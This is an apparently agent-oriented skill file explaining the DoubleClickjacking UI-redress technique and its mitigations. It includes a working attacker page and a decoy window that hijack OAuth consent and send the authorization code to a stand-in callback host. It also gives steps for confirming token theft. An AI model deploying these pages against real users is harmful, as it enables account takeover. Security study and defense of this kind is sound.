---
name: clickjacking-novel-deep
description: 2024–2026 clickjacking frontier — DoubleClickjacking as the published "defense-irrelevant UI redress" primitive bypassing X-Frame-Options, CSP frame-ancestors, and SameSite cookies via window-swap during double-click, plus confirmation discipline and the bounded live-frontier reasoning.
sibling: clickjacking
load_when: scan_mode == "deep"
---

# Clickjacking — Novel Deep

Load `clickjacking` for the base-tier framing (attack-surface, classic iframe-overlay primitives, defense headers, confirmation discipline). Load `clickjacking_advanced_deep` for differential/bypass depth, per-browser enforcement, nested-frame and shadow-DOM primitives, drag-and-drop and keyboard-focus mechanics, framework-specific exposure, and chained exploitation. This file owns the 2024–2026 published frontier — primarily DoubleClickjacking as the "defense-irrelevant UI redress" primitive — plus the bounded-surface reasoning for why the frontier is a singleton as of this writing.

Classic clickjacking is a mature class defended by the `X-Frame-Options` + CSP `frame-ancestors` + `SameSite` cookie trio when the configuration is complete. The novel frontier is the primitive that bypasses this stack **structurally** — not by exploiting a configuration gap, but by using a mechanism the three defenses do not cover. DoubleClickjacking is the published instance; the class it instantiates ("defense-irrelevant UI redress") has no sibling primitives in the 2024–2026 literature of equivalent primary-source evidence. The injection-mechanism and authority-consequence overlap routes stay the same as the base/advanced files: cross-origin credential-echo to `cors_misconfiguration`, state-change invariant to `csrf`, broader frame-containment to `browser_security`.

## DoubleClickjacking — Mechanism and Class

Primary source: Paulos Yibelo, "DoubleClickjacking: A New Era of UI Redressing," published December 2024 at `evil.blog/2024/12/doubleclickjacking-what.html`; the technique was disclosed with named-vendor PoCs against Salesforce, Slack, and Shopify among others. Corroborating coverage: The Hacker News (January 2025), Infosecurity Magazine, Cybersecurity News, Bank Info Security, Security Affairs, CyberInsider — the three-defense bypass claim is reinforced across multiple reputable secondary sources.

**The structural novelty**. DoubleClickjacking bypasses all three primary clickjacking defenses — `X-Frame-Options`, CSP `frame-ancestors`, and `SameSite=Lax/Strict` cookies — because:
1. The attack **uses no iframe**. `window.open` + `window.opener.location` navigate the parent window to the target; the parent is a top-level navigation, not a framed context. `X-Frame-Options` and `frame-ancestors` are frame controls; a top-level navigation is unrelated.
2. The final click lands **first-party in the user's top-level window** after the window-swap. `SameSite` cookie restrictions apply to cross-site requests; a top-level navigation to the target becomes a same-site request from the user's perspective at click time, so even `SameSite=Strict` cookies travel.

The primary source states the three-defense bypass verbatim: "it opens the door to new UI manipulation attacks that bypass all known clickjacking protections, including the X-Frame-Options header, CSP's frame-ancestors and SameSite: Lax/Strict cookies," and reinforces: "methods like X-Frame-Options, SameSite cookies, or CSP cannot defend against this attack."

## DoubleClickjacking — Exploitation Primitive

The exploitation primitive is a window-swap during a double-click: the attacker opens a new top-level window showing a decoy prompt (e.g., CAPTCHA-style "double-click to verify"), the first click's `mousedown` closes the top/decoy window while `window.opener.location` has navigated the parent window to a sensitive target page (e.g., OAuth consent at Salesforce / Slack / Shopify), so the second click's `mouseup` lands on the now-exposed Authorize button in the parent window. The exploit sits in the `mousedown`/`mouseup` timing gap, not in framing.

**Precondition set**:
- Attacker page can call `window.open()` (requires a user gesture to open a new window in modern browsers — the first click satisfies this)
- Target page is reachable at a known URL producing a one-click state-change element at a predictable screen position
- The user is authenticated to the target in the same browser (not merely a browser-level profile; the specific cookies / tokens needed must be in the user's cookie jar at the target origin at window-swap time)
- The user performs a double-click on the attacker's decoy (common UX pattern: "double-click to confirm," CAPTCHA solvers, verification prompts)

**Attack recipe** (verbatim from the primary-source demonstration):
```html
<!doctype html>
<html>
<head><title>Double-click to verify</title></head>
<body>
<h1>Please double-click to prove you are human</h1>
<button id="verify" onclick="openWindow()">Verify</button>
<script>
function openWindow() {
  // Open attacker-controlled decoy window with "double-click here" UI
  const decoy = window.open('/decoy.html', '_blank', 'width=600,height=400');
  
  // While user is looking at decoy, navigate parent to sensitive target
  // When user double-clicks the decoy, mousedown closes decoy and mouseup lands in parent
  window.location = 'https://target.tld/oauth/authorize?client_id=attacker-app&scope=…&redirect_uri=https://evil.tld/callback';
  
  // Decoy window closes on first click (mousedown handler)
  // Parent window now shows target's OAuth consent screen
  // Second click (mouseup) lands on target's "Authorize" button at predictable position
}
</script>
</body>
</html>
```

In the decoy window's HTML:
```html
<!-- /decoy.html -->
<!doctype html>
<html>
<body style="background:white;cursor:pointer">
<div style="position:absolute;top:100px;left:200px;width:200px;height:50px;background:#eee;text-align:center;line-height:50px">
  Double-click here to verify
</div>
<script>
// Close window on first mousedown (not click, which fires only after mouseup)
document.addEventListener('mousedown', () => window.close());
</script>
</body>
</html>
```

**Why `mousedown` and not `click`**: the `click` event fires after both `mousedown` and `mouseup`. If the decoy closes on `click`, the user's second click (which has to fire its own mousedown+mouseup) might not have reached the newly-swapped parent window. By closing the decoy on the first `mousedown`, the first `mouseup` is a no-op on the decoy (already closed), and the user's second mousedown→mouseup pair fires entirely on the parent window — specifically on the pixel coordinates where the parent's authorize button now sits.

**Confirmation**: the target's OAuth client (`attacker-app`) receives a valid authorization code; the token exchange succeeds; the attacker now holds valid credentials for the victim's account. For non-OAuth state changes (email change, settings mutation), the confirmation is the state change in the target's audit log attributed to the victim.

## Impact and Scope

**Confirmed targets** (per primary source and corroborating coverage): Salesforce OAuth consent, Slack OAuth consent, Shopify OAuth consent, and numerous other authorization endpoints across SaaS platforms. The DoubleClickjacking class is applicable broadly across OAuth providers, consent screens, two-click confirmation flows, and any top-level navigation that produces a predictable-position one-click state-change element.

**Impact per target class**:
- OAuth consent clickjacking → attacker-registered app receives victim's authority (full ATO on the OAuth scope granted)
- Account-settings mutation → email change, password change, 2FA disable
- Payment confirmation → one-click confirm with attacker-chosen amount
- Admin console actions → role grant, user delete, settings mutation
- API key generation / rotation → persistent-access credential capture

**What does NOT work**:
- Targets that require authentication at the time of click AND have cookie partitioning (Safari ITP) may fail — the top-level navigation lands with a potentially partitioned cookie jar
- Multi-step forms (two separate confirmations) require more sophisticated double-click choreography
- Targets whose state-change element position shifts between page states (SPAs with route-dependent layout) fail reproducibility

## Mitigation

**The published mitigation** (per Yibelo's disclosure and vendor advisories):

Client-side JavaScript check that disables consequential buttons until a user interaction specifically occurs on the current window, OR requires a user interaction fundamentally incompatible with the DoubleClickjacking timing (e.g., a drag-based gesture, a hold-to-confirm):
```javascript
// Example mitigation (illustrative; vendor-specific implementations vary)
const consentButton = document.getElementById('authorize');
consentButton.disabled = true;

// Only enable the button after a trusted user gesture on this window
window.addEventListener('mousemove', () => {
  // The user's mouse must move on this window after window-swap
  // During DoubleClickjacking, the mouse was on the decoy, so no mousemove
  consentButton.disabled = false;
}, { once: true });
```

**Alternative mitigations**:
- Require a server-side generated nonce in a URL parameter that cannot be set by the attacker (clickjacking cannot read the nonce from a framed context, and the top-level navigation also cannot set the nonce without authority)
- Server-side rate-limit on consent decisions from a specific session; a sudden click after an opener-driven navigation is anomaly-detectable
- UI "pop" animation on page-load that shifts the state-change button's position for several seconds — a double-click fired too early misses the button

**What does NOT mitigate**:
- Setting `X-Frame-Options: DENY` or CSP `frame-ancestors 'none'` (not framed to begin with)
- Setting `SameSite=Strict` cookies (top-level navigation is same-site at click time)
- `rel="noopener"` on the attacker's own links (the attacker controls the opener; `noopener` is a defender-side link attribute, not relevant to this attack)

**Browser-level mitigation gap**: as of this writing (2026-10-04), no browser has introduced a structural fix for DoubleClickjacking. The gap persists because the primitive relies on legitimate behaviors (`window.open`, `window.opener.location`) that have broad legitimate use.

## The Bounded Live-Frontier Class

The novel clickjacking frontier is anchored to DoubleClickjacking as the single published "defense-irrelevant UI redress" primitive bypassing the three-defense stack structurally. No sibling primitives of equivalent primary-source evidence have been named in the 2024–2026 literature as of this writing — the broader class of "UI redress that defeats X-Frame-Options + frame-ancestors + SameSite by not using an iframe" has one well-documented instance, and the architectural reason for the gap (top-level navigation with window-swap timing) does not immediately suggest a dozen other primitives; sibling candidates (long-press variants, drag-and-drop variants of the window-swap, keyboard-shortcut variants) remain unverified against the primary-source bar.

**Why the frontier is bounded**:
1. The classic class (iframe overlay) is architecturally covered by the three defenses when configured; it has moved out of the "novel" tier
2. The "structural bypass" class requires an attack mechanism that evades all three defenses simultaneously — not merely one — and the attack-surface shape of `window.open` + window-swap is narrow
3. Browser-vendor interest in closing the primitive would narrow the surface further; the current gap persists because no major vendor has invested in a structural fix
4. Peer researchers' follow-up work since Yibelo's disclosure has largely been applications (named-vendor PoCs, specific-flow adaptations) rather than new structural bypass primitives

The frontier is live but bounded: DoubleClickjacking is the sole structural bypass primitive with primary-source evidence as of 2026-10-04. The clickjacking novel-tier surface is narrow by the class's architecture, not by lack of research investment.

## Confirmation Discipline for Novel-Tier Findings

- The attack reproduces from a fresh browser session where the victim is authenticated to the target but has had no interaction with the attacker's origin — this is the "normal user" shape, not an attacker-coached user
- The decoy's UX must plausibly induce a double-click: the specific prompt ("double-click to verify," "CAPTCHA," "sign to continue") is as important as the technical primitive; a decoy that reads suspiciously is not a reproducible attack
- Record the exact browser version(s), the target page URL at the time of click, and the pixel position of the state-change element at that URL; novel-tier findings are measurement artifacts, not generalities
- For OAuth clickjacking specifically, verify the attacker's app receives a valid code and that the token exchange succeeds — the attack is confirmed only when the attacker holds the victim's token, not when the "Authorize" button is clicked
- Preserve the attacker page's HTML as the engagement artifact; follow-on review may test variations against vendor-specific mitigations
- Where a target has deployed a client-side mitigation (nonce-based, delayed-enable, pointer-move-required), explicitly test it; a well-mitigated target returns the primitive to escape-hatch territory

The clickjacking novel-tier frontier is a published-singleton class — DoubleClickjacking — whose structural bypass of the three primary defenses rests on a window-swap during the mousedown/mouseup gap rather than on framing. No equivalent-evidence sibling primitives have been published; the surface is bounded by the class's architectural narrowness, not by lack of research attention.

## Summary

DoubleClickjacking is the sole 2024–2026 primary-source primitive for "defense-irrelevant UI redress," bypassing `X-Frame-Options`, CSP `frame-ancestors`, and `SameSite=Lax/Strict` cookies structurally via `window.open` + `window.opener.location` with mousedown-timing to swap the parent window to the target between the two clicks of a double-click decoy. The published impact is OAuth-consent takeover and settings-mutation across named SaaS targets. For the classic clickjacking class and its defense headers, load `clickjacking`; for the differential/bypass surface and chained exploitation, load `clickjacking_advanced_deep`. The authority-consequence of a successful DoubleClickjacking against OAuth consent routes to `authentication_jwt_novel_deep` for the token-exchange primitive; the state-change invariant routes to `csrf`.
